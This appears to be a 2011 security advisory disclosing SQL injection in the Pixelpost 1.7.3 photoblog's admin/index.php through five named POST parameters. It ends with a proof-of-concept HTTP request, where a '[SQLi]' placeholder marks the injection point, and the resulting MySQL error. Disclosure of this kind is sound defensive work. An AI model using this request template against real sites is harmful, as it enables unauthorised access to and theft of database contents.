@@ -1,0 +1,65 @@
+--------------------------------------------------------------------
+
+Pixelpost 1.7.3 Multiple POST Variables SQL Injection Vulnerability
+
+Vendor: Pixelpost.org
+Product web page: http://www.pixelpost.org
+Affected version: 1.7.3
+
+Summary: Pixelpost is an open-source, standards-compliant, multi-lingual,
+fully extensible photoblog application for the web. Anyone who has web-space
+that meets the requirements can download and use Pixelpost for free!
+
+Desc: Pixelpost is vulnerable to an SQL Injection attack when input is passed
+to several POST parameters (findfid, id, selectfcat, selectfmon, selectftag).
+The script (admin/index.php) fails to properly sanitize the input before being
+returned to the user allowing the attacker to compromise the entire DB system
+and view sensitive information.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+Advisory ID: ZSL-2011-4992
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4992.php
+
+
+03.02.2011
+
+--------------------------------------------------------------------
+
+Vulnerable variables: 
+
+- findfid
+- id
+- selectfcat
+- selectfmon
+- selectftag
+
+Example:
+
+POST /pixelpost_v1.7.3/admin/index.php?view=images HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Host: localhost
+Content-Length: 62
+Cookie: PHPSESSID=9nqb5cbq1v4si85tidd4gas166;passwordbla=
+Connection: Close
+Pragma: no-cache
+
+selectfcat=3&selectftag=1&selectfmon=1&findfid=1[SQLi]&findid=Go%21
+
+------
+
+HTTP/1.1 200 OK
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near '' limit 0,1' at line 1.
+
+-------
